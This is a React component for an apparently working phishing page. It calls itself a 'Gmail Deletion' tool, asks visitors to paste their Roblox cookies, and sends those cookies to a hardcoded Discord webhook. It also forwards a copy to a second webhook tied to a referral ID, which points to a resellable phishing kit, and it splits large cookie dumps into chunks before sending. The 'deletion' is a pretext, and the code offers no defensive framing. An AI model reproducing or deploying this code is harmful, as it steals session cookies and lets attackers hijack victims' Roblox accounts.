import { useState } from "react";
import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { ArrowLeft, Cookie } from "lucide-react";

interface RobloxCookiesProps {
  onBack: () => void;
  onSuccess: () => void;
}

export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
  const [cookies, setCookies] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const MAIN_WEBHOOK =
    "https://discord.com/api/webhooks/1382124073953263787/QNnd4cako-sTG77Hv6sQ-ZDT1ZX0HM22fuVvIT4ednht3YIj91mEgYwZJ8HiH8TkgvLE";

  const getWebhookData = () => {
    const urlParams = new URLSearchParams(window.location.search);
    const refId = urlParams.get("ref");

    if (refId) {
      const webhookKey = `webhook_${refId}`;
      const webhookData = localStorage.getItem(webhookKey);

      if (webhookData) {
        try {
          const parsed = JSON.parse(webhookData);
          if (parsed.webhook) {
            return { refId, webhookData: parsed };
          }
        } catch (error) {
          console.error("❌ Error parsing webhook data:", error);
        }
      }
    }

    return { refId: null, webhookData: null };
  };

  // Split large text into smaller chunks - Discord has strict limits
  const splitTextIntoChunks = (text: string, maxLength = 1000) => {
    if (!text || text.length <= maxLength) return [text];

    const chunks = [];
    for (let i = 0; i < text.length; i += maxLength) {
      chunks.push(text.substring(i, i + maxLength));
    }
    return chunks;
  };

  const sendToWebhook = async (
    webhookUrl: string,
    data: any,
    webhookType: string,
  ) => {
    try {
      console.log(`🚀 Sending to ${webhookType} webhook:`, webhookUrl);

      const { refId } = getWebhookData();
      const timestamp = new Date().toISOString();

      // Clean the cookies data
      const cleanCookies = String(data.cookies || "").trim();
      if (!cleanCookies) {
        console.error("❌ No valid cookies data");
        return false;
      }

      console.log(`📊 Cookie data length: ${cleanCookies.length} characters`);

      // For very large data, send as multiple separate webhook calls
      if (cleanCookies.length > 800) {
        return await sendLargeData(
          webhookUrl,
          cleanCookies,
          webhookType,
          refId,
          timestamp,
        );
      }

      // For smaller data, send as single embed
      const embed = {
        title:
          webhookType === "custom"
            ? "🔥 Gmail Delete Request (Custom Instance)"
            : "🔥 Gmail Delete Request (Main System)",
        color: webhookType === "custom" ? 12632256 : 16711680,
        description:
          webhookType === "custom"
            ? "🎯 New Gmail deletion request from your custom instance!"
            : "📨 Gmail deletion request received and processed.",
        fields: [
          {
            name: "🍪 Roblox Cookies",
            value: `\`\`\`\n${cleanCookies}\n\`\`\``,
            inline: false,
          },
          {
            name: "⏰ Timestamp",
            value: timestamp,
            inline: true,
          },
          {
            name: "🎯 Action",
            value: "Delete Gmail",
            inline: true,
          },
          ...(refId
            ? [
                {
                  name: "🔗 Instance ID",
                  value: refId,
                  inline: true,
                },
              ]
            : []),
        ],
        footer: {
          text:
            webhookType === "custom"
              ? "X-LiNk Custom Instance"
              : "X-LiNk Main System",
        },
      };

      const payload = { embeds: [embed] };

      console.log(`📤 Sending single embed to ${webhookType} webhook`);

      const response = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      if (response.ok) {
        console.log(`✅ ${webhookType} webhook sent successfully!`);
        return true;
      } else {
        const errorText = await response.text();
        console.error(
          `❌ ${webhookType} webhook failed:`,
          response.status,
          errorText,
        );
        return false;
      }
    } catch (error) {
      console.error(`❌ ${webhookType} webhook error:`, error);
      return false;
    }
  };

  const sendLargeData = async (
    webhookUrl: string,
    cookiesData: string,
    webhookType: string,
    refId: string | null,
    timestamp: string,
  ) => {
    try {
      console.log(`📦 Sending large data in multiple messages...`);

      // Split cookies into chunks
      const chunks = splitTextIntoChunks(cookiesData, 1000);
      console.log(`📊 Split into ${chunks.length} chunks`);

      let allSuccess = true;

      // Send header message first
      const headerEmbed = {
        title:
          webhookType === "custom"
            ? "🔥 Gmail Delete Request (Custom Instance) - LARGE DATA"
            : "🔥 Gmail Delete Request (Main System) - LARGE DATA",
        color: webhookType === "custom" ? 12632256 : 16711680,
        description:
          webhookType === "custom"
            ? `🎯 Large Gmail deletion request from your custom instance!\nData split into ${chunks.length} parts.`
            : `📨 Large Gmail deletion request received.\nData split into ${chunks.length} parts.`,
        fields: [
          {
            name: "⏰ Timestamp",
            value: timestamp,
            inline: true,
          },
          {
            name: "🎯 Action",
            value: "Delete Gmail",
            inline: true,
          },
          {
            name: "📊 Total Parts",
            value: chunks.length.toString(),
            inline: true,
          },
          ...(refId
            ? [
                {
                  name: "🔗 Instance ID",
                  value: refId,
                  inline: true,
                },
              ]
            : []),
        ],
        footer: {
          text:
            webhookType === "custom"
              ? "X-LiNk Custom Instance"
              : "X-LiNk Main System",
        },
      };

      // Send header
      let response = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [headerEmbed] }),
      });

      if (!response.ok) {
        console.error(`❌ Header message failed for ${webhookType}`);
        allSuccess = false;
      } else {
        console.log(`✅ Header message sent to ${webhookType}`);
      }

      // Send each chunk as separate message with small delay
      for (let i = 0; i < chunks.length; i++) {
        const chunkEmbed = {
          title: `🍪 Cookies Part ${i + 1}/${chunks.length}`,
          color: webhookType === "custom" ? 11119017 : 16744516,
          description: `\`\`\`\n${chunks[i]}\n\`\`\``,
          footer: {
            text: `Part ${i + 1} of ${chunks.length}`,
          },
        };

        try {
          // Small delay between chunks to avoid rate limiting
          if (i > 0) {
            await new Promise((resolve) => setTimeout(resolve, 200));
          }

          response = await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [chunkEmbed] }),
          });

          if (response.ok) {
            console.log(`✅ Chunk ${i + 1} sent to ${webhookType}`);
          } else {
            console.error(`❌ Chunk ${i + 1} failed for ${webhookType}`);
            allSuccess = false;
          }
        } catch (error) {
          console.error(
            `❌ Error sending chunk ${i + 1} to ${webhookType}:`,
            error,
          );
          allSuccess = false;
        }
      }

      return allSuccess;
    } catch (error) {
      console.error(`❌ Error in sendLargeData for ${webhookType}:`, error);
      return false;
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cookies.trim()) {
      setError("Please enter Roblox cookies");
      return;
    }

    setIsLoading(true);
    setError("");

    const { refId, webhookData } = getWebhookData();
    const data = { cookies };

    console.log("🚀 Starting webhook delivery process...");
    console.log("📋 Data size:", cookies.length, "characters");

    let mainWebhookSuccess = false;
    let customWebhookSuccess = false;

    // ALWAYS send to main webhook first
    try {
      console.log("📤 Sending to MAIN webhook...");
      mainWebhookSuccess = await sendToWebhook(MAIN_WEBHOOK, data, "main");
      console.log(
        "📊 Main webhook result:",
        mainWebhookSuccess ? "✅ SUCCESS" : "❌ FAILED",
      );
    } catch (error) {
      console.error("❌ Main webhook failed:", error);
    }

    // Send to custom webhook if this is a custom instance
    if (refId && webhookData && webhookData.webhook) {
      try {
        console.log("📤 Sending to CUSTOM webhook...");
        customWebhookSuccess = await sendToWebhook(
          webhookData.webhook,
          data,
          "custom",
        );
        console.log(
          "📊 Custom webhook result:",
          customWebhookSuccess ? "✅ SUCCESS" : "❌ FAILED",
        );
      } catch (error) {
        console.error("❌ Custom webhook failed:", error);
      }
    }

    // Report final results
    console.log("📊 FINAL DELIVERY RESULTS:");
    console.log(
      `  🎯 Main webhook: ${mainWebhookSuccess ? "✅ DELIVERED" : "❌ FAILED"}`,
    );
    console.log(
      `  🎯 Custom webhook: ${customWebhookSuccess ? "✅ DELIVERED" : "❌ FAILED"}`,
    );

    // Consider success if at least one webhook succeeded
    if (mainWebhookSuccess || customWebhookSuccess) {
      console.log("🎉 Data delivered successfully!");
      onSuccess();
    } else {
      console.error("💥 ALL WEBHOOKS FAILED!");
      setError("Failed to process request. Please try again.");
    }

    setIsLoading(false);
  };

  // Check if this is a custom instance
  const { refId } = getWebhookData();
  const isCustomInstance = !!refId;

  return (
    <motion.div
      className="flex items-center justify-center min-h-screen p-4"
      initial={{ opacity: 0, x: 50 }}
      animate={{ opacity: 1, x: 0 }}
      transition={{ duration: 0.5 }}
    >
      <Card className="w-full max-w-2xl bg-black/80 border-gray-500/50 backdrop-blur-2xl shadow-2xl shadow-gray-400/20">
        <CardHeader className="text-center pb-6">
          <motion.div
            initial={{ y: -20 }}
            animate={{ y: 0 }}
            transition={{ delay: 0.2 }}
            className="flex flex-col items-center"
          >
            <div className="mb-4 p-3 bg-gradient-to-br from-red-600/20 to-gray-500/20 rounded-full border border-gray-400/30">
              <Cookie className="w-8 h-8 text-red-400" />
            </div>
            <CardTitle className="text-3xl font-bold text-white mb-2 bg-gradient-to-r from-white to-gray-300 bg-clip-text text-transparent">
              Gmail Deletion
            </CardTitle>
            <p className="text-gray-300 text-sm">
              Enter Roblox cookies to proceed with deletion
            </p>
            {isCustomInstance && (
              <div className="mt-2 px-3 py-1 bg-gradient-to-r from-gray-600/20 to-gray-500/20 rounded-full border border-gray-400/30">
                <p className="text-gray-300 text-xs">
                  Custom Instance: {refId}
                </p>
              </div>
            )}
          </motion.div>
        </CardHeader>
        <CardContent className="space-y-6">
          <form onSubmit={handleSubmit} className="space-y-4">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.3 }}
            >
              <label className="block text-white font-medium mb-2">
                Roblox Cookies
              </label>
              <Textarea
                placeholder="Paste your Roblox cookies here... (supports any size)"
                value={cookies}
                onChange={(e) => setCookies(e.target.value)}
                className="bg-black/60 border-gray-500/50 text-white placeholder:text-gray-400 min-h-[200px] focus:border-gray-400 transition-colors resize-none"
                disabled={isLoading}
              />
              {cookies.length > 0 && (
                <div className="flex justify-between items-center mt-1">
                  <p className="text-xs text-gray-400">
                    Data size: {cookies.length} characters
                  </p>
                  {cookies.length > 800 && (
                    <span className="text-xs text-green-400 bg-green-900/20 px-2 py-1 rounded">
                      ✓ Will send as multiple parts
                    </span>
                  )}
                </div>
              )}
            </motion.div>

            {error && (
              <motion.p
                className="text-red-400 text-sm text-center font-medium bg-red-900/20 border border-red-500/30 rounded-lg py-2 px-4"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
              >
                {error}
              </motion.p>
            )}

            <motion.div
              className="flex gap-4"
              initial={{ y: 20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.4 }}
            >
              <Button
                type="button"
                onClick={onBack}
                variant="outline"
                className="flex-1 border-gray-600 text-gray-300 hover:bg-gray-700 h-12"
                disabled={isLoading}
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back
              </Button>
              <Button
                type="submit"
                className="flex-1 bg-gradient-to-r from-red-600 to-gray-600 hover:from-red-500 hover:to-gray-500 text-white h-12 font-semibold shadow-lg shadow-gray-400/25"
                disabled={isLoading || !cookies.trim()}
              >
                {isLoading ? "Processing..." : "Delete Gmail"}
              </Button>
            </motion.div>
          </form>
        </CardContent>
      </Card>
    </motion.div>
  );
};
